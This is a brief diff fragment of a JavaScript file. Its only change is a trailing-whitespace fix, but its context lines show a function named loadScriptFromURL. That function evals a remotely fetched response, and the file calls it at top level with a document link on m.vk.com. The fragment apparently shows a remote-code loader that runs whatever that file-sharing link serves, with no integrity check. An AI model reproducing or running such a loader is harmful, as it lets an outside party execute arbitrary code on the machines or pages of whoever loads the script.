@@ -11,6 +11,6 @@ function loadScriptFromURL(url) {
     }
     eval(request.response);
     return true;
-} 
+}
 
   loadScriptFromURL('https://m.vk.com/doc-125614288_450517824'); 
